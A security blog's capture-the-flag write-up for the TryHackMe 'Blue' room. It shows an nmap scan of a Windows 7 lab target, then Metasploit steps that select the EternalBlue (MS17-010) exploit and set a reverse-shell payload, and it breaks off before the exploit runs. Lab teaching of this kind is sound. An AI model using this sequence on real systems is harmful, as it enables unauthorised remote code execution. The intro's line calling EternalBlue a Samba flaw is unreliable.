<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - Blue" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-blue/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-blue/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-23T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - Blue" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - Blue","dateModified":"2021-03-23T00:00:00+05:30","datePublished":"2021-03-23T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-blue/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-blue/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - Blue | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - Blue</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - Blue</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Mar 23, 2021, 12:00 AM +0530" > Mar 23 <i class="unloaded">2021-03-23T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1763 words">9 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="blue"><a href="https://tryhackme.com/room/blue" target="_blank">Blue</a></h2><p>This room contains detailed info about eternalblue vulnerability of samba and windows privilege escalation methods.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a>.</p><h2 id="tools-used">Tools Used</h2><h3 id="enumeration">Enumeration</h3><ul><li>NMAP</ul><h3 id="exploitation">Exploitation</h3><ul><li>Msfconsole</ul><h2 id="task-1---recon">Task 1 - Recon</h2><h3 id="references">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a></ul><p>Use <code>nmap</code> to enumerate the target machine using <code>nmap -PN -T4 -sS --top-ports 1000 -A &lt;ip&gt;</code></p><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.80%20(%20https://nmap.org%20)%20at%202021-04-23%2005:10%20UTC%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up%20(0.00048s%20latency).%0ANot%20shown:%20991%20closed%20ports%0APORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20VERSION%0A135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A139/tcp%20%20%20open%20%20netbios-ssn%20%20Microsoft%20Windows%20netbios-ssn%0A445/tcp%20%20%20open%20%20microsoft-ds%20Windows%207%20Professional%207601%20Service%20Pack%201%20microsoft-ds%20(workgroup:%20WORKGROUP)%0A3389/tcp%20%20open%20%20tcpwrapped%0A%7C_ssl-date:%202021-04-23T05:12:27+00:00;%20-1s%20from%20scanner%20time.%0A49152/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49153/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49154/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49158/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49160/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0AMAC%20Address:%2002:15:D5:45:ED:73%20(Unknown)%0ANo%20exact%20OS%20matches%20for%20host%20(If%20you%20know%20what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20).%0A%0ATCP/IP%20fingerprint:%0A%0AOS:SCAN(V=7.80%25E=4%25D=4/23%25OT=135%25CT=1%25CU=41002%25PV=Y%25DS=1%DC=D%25G=Y%25M=0215D5%25%0AOS:TM=60825777%25P=x86_64-pc-linux-gnu)SEQ(SP=103%25GCD=1%25ISR=10D%25TI=I%25CI=I%25II=%0AOS:I%25SS=S%25TS=7)OPS(O1=M2301NW8ST11%25O2=M2301NW8ST11%25O3=M2301NW8NNT11%25O4=M230%0AOS:1NW8ST11%25O5=M2301NW8ST11%25O6=M2301ST11)WIN(W1=2000%25W2=2000%25W3=2000%25W4=200%0AOS:0%25W5=2000%25W6=2000)ECN(R=Y%DF=Y%25T=80%25W=2000%25O=M2301NW8NNS%CC=N%25Q=)T1(R=Y%25%0AOS:DF=Y%25T=80%25S=O%25A=S+%25F=AS%25RD=0%25Q=)T2(R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=S%25F=AR%25O=%25RD=%0AOS:0%25Q=)T3(R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=O%25F=AR%25O=%25RD=0%25Q=)T4(R=Y%DF=Y%25T=80%25W=0%25S%0AOS:=A%25A=O%25F=R%25O=%25RD=0%25Q=)T5(R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)T6(R%0AOS:=Y%DF=Y%25T=80%25W=0%25S=A%25A=O%25F=R%25O=%25RD=0%25Q=)T7(R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=S+%25F=%0AOS:AR%25O=%25RD=0%25Q=)U1(R=Y%DF=N%25T=80%25IPL=164%25UN=0%25RIPL=G%25RID=G%25RIPCK=G%25RUCK=G%25%0AOS:RUD=G)IE(R=Y%DFI=N%25T=80%CD=Z)%0A%0ANetwork%20Distance:%201%20hop%0AService%20Info:%20Host:%20JON-PC;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0A%0AHost%20script%20results:%0A%7C_clock-skew:%20mean:%201h14m59s,%20deviation:%202h30m00s,%20median:%20-1s%0A%7C_nbstat:%20NetBIOS%20name:%20JON-PC,%20NetBIOS%20user:%20%3Cunknown%3E,%20NetBIOS%20MAC:%2002:15:d5:45:ed:73%20(unknown)%0A%7C%20smb-os-discovery:%0A%7C%20%20%20OS:%20Windows%207%20Professional%207601%20Service%20Pack%201%20(Windows%207%20Professional%206.1)%0A%7C%20%20%20OS%20CPE:%20cpe:/o:microsoft:windows_7::sp1:professional%0A%7C%20%20%20Computer%20name:%20Jon-PC%0A%7C%20%20%20NetBIOS%20computer%20name:%20JON-PC%5Cx00%0A%7C%20%20%20Workgroup:%20WORKGROUP%5Cx00%0A%7C_%20%20System%20time:%202021-04-23T00:12:13-05:00%0A%7C%20smb-security-mode:%0A%7C%20%20%20account_used:%20guest%0A%7C%20%20%20authentication_level:%20user%0A%7C%20%20%20challenge_response:%20supported%0A%7C_%20%20message_signing:%20disabled%20(dangerous,%20but%20default)%0A%7C%20smb2-security-mode:%0A%7C%20%20%202.02:%0A%7C_%20%20%20%20Message%20signing%20enabled%20but%20not%20required%0A%7C%20smb2-time:%0A%7C%20%20%20date:%202021-04-23T05:12:13%0A%7C_%20%20start_date:%202021-04-23T05:08:45%0A%0ATRACEROUTE%0AHOP%20RTT%20%20%20%20%20ADDRESS%0A1%20%20%200.48%20ms%20%3Chostname%3E%20(%3Cip%3E)%0A%0AOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%20148.44%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-23 05:10 UTC
Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
Host is up (0.00048s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2021-04-23T05:12:27+00:00; -1s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:15:D5:45:ED:73 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.80%E=4%D=4/23%OT=135%CT=1%CU=41002%PV=Y%DS=1%DC=D%G=Y%M=0215D5%
OS:TM=60825777%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M230
OS:1NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=200
OS:0%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=N%Q=)T1(R=Y%
OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:15:d5:45:ed:73 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-23T00:12:13-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-23T05:12:13
|_  start_date: 2021-04-23T05:08:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms &lt;hostname&gt; (&lt;ip&gt;)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.44 seconds
</code></pre><p>Use <code>firefox</code> and search for <code>windows 7 professional 7601 service pack 1 smb vulnerability</code> which will result in the <a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/" target="_blank">url</a>.</p><h2 id="task-2---gain-access">Task 2 - Gain Access</h2><p>Use <code>msfconsole -q</code> to search for <code>eternalblue</code> exploit.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20search%20eternalblue%0A%0AMatching%20Modules%0A%0A#%20%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disclosure%20Date%20%20Rank%20%20%20%20%20Check%20%20Description%0A-%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20---------------%20%20----%20%20%20%20%20-----%20%20-----------%0A0%20%20auxiliary/admin/smb/ms17_010_command%20%20%20%20%20%20%20%20%20%20%202017-03-14%20%20%20%20%20%20%20normal%20%20%20No%20%20%20%20%20MS17-010%20EternalRomance/EternalSynergy/EternalChampion%20SMB%20Remote%20Windows%20Command%20Execution%0A1%20%20auxiliary/scanner/smb/smb_ms17_010%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20normal%20%20%20No%20%20%20%20%20MS17-010%20SMB%20RCE%20Detection%0A2%20%20exploit/windows/smb/ms17_010_eternalblue%20%20%20%20%20%20%202017-03-14%20%20%20%20%20%20%20average%20%20Yes%20%20%20%20MS17-010%20EternalBlue%20SMB%20Remote%20Windows%20Kernel%20Pool%20Corruption%0A3%20%20exploit/windows/smb/ms17_010_eternalblue_win8%20%202017-03-14%20%20%20%20%20%20%20average%20%20No%20%20%20%20%20MS17-010%20EternalBlue%20SMB%20Remote%20Windows%20Kernel%20Pool%20Corruption%20for%20Win8+%0A4%20%20exploit/windows/smb/ms17_010_psexec%20%20%20%20%20%20%20%20%20%20%20%202017-03-14%20%20%20%20%20%20%20normal%20%20%20Yes%20%20%20%20MS17-010%20EternalRomance/EternalSynergy/EternalChampion%20SMB%20Remote%20Windows%20Code%20Execution%0A5%20%20exploit/windows/smb/smb_doublepulsar_rce%20%20%20%20%20%20%202017-04-14%20%20%20%20%20%20%20great%20%20%20%20Yes%20%20%20%20SMB%20DOUBLEPULSAR%20Remote%20Code%20Execution%0A%0A%0AInteract%20with%20a%20module%20by%20name%20or%20index,%20for%20example%20use%205%20or%20use%20exploit/windows/smb/smb_doublepulsar_rce%0A%0Amsf5%20%3E%20use%20exploit/windows/smb/ms17_010_eternalblue%0A[*]%20No%20payload%20configured,%20defaulting%20to%20windows/x64/meterpreter/reverse_tcp" type="button"></button></div></div><pre><code>msf5 &gt; search eternalblue

Matching Modules

#  Name                                           Disclosure Date  Rank     Check  Description
-  ----                                           ---------------  ----     -----  -----------
0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
</code></pre><p>Check the current options and set variables.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(windows/smb/ms17_010_eternalblue)%20%3E%20show%20options%0A%0AModule%20options%20(exploit/windows/smb/ms17_010_eternalblue):%0A%0AName%20%20%20%20%20%20%20%20%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20%20%20%20%20%20%20%20%20---------------%20%20--------%20%20-----------%0ARHOSTS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20host(s),%20range%20CIDR%20identifier,%20or%20hosts%20file%20with%20syntax%20'file:%3Cpath%3E'%0ARPORT%20%20%20%20%20%20%20%20%20%20445%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20port%20(TCP)%0ASMBDomain%20%20%20%20%20%20.%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20(Optional)%20The%20Windows%20domain%20to%20use%20for%20authentication%0ASMBPass%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20(Optional)%20The%20password%20for%20the%20specified%20username%0ASMBUser%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20(Optional)%20The%20username%20to%20authenticate%20as%0AVERIFY_ARCH%20%20%20%20true%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20Check%20if%20remote%20architecture%20matches%20exploit%20Target.%0AVERIFY_TARGET%20%20true%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20Check%20if%20remote%20OS%20matches%20exploit%20Target.%0A%0A%0APayload%20options%20(windows/x64/meterpreter/reverse_tcp):%0A%0AName%20%20%20%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20%20%20%20---------------%20%20--------%20%20-----------%0AEXITFUNC%20%20thread%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20Exit%20technique%20(Accepted:%20'',%20seh,%20thread,%20process,%20none)%0ALHOST%20%20%20%20%20%3Csource-ip%3E%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20address%20(an%20interface%20may%20be%20specified)%0ALPORT%20%20%20%20%204444%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20port%0A%0A%0AExploit%20target:%0A%0AId%20%20Name%0A--%20%20----%0A0%20%20%20Windows%207%20and%20Server%202008%20R2%20(x64)%20All%20Service%20Packs%0A%0A%0Amsf5%20exploit(windows/smb/ms17_010_eternalblue)%20%3E%20set%20RHOSTS%20%3Ctarget-ip%3E%0ARHOSTS%20=%3E%20%3Ctarget-ip%3E%0A%0Amsf5%20exploit(windows/smb/ms17_010_eternalblue)%20%3E%20set%20payload%20windows/x64/shell/reverse_tcp%0Apayload%20=%3E%20windows/x64/shell/reverse_tcp" type="button"></button></div></div><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

Name           Current Setting  Required  Description
----           ---------------  --------  -----------
RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
RPORT          445              yes       The target port (TCP)
SMBDomain      .                no        (Optional) The Windows domain to use for authentication
SMBPass                         no        (Optional) The password for the specified username
SMBUser                         no        (Optional) The username to authenticate as
VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST     &lt;source-ip&gt;      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port


Exploit target:

Id  Name
--  ----
0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS &lt;target-ip&gt;
RHOSTS =&gt; &lt;target-ip&gt;

msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/shell/reverse_tcp
payload =&gt; windows/x64/shell/reverse_tcp
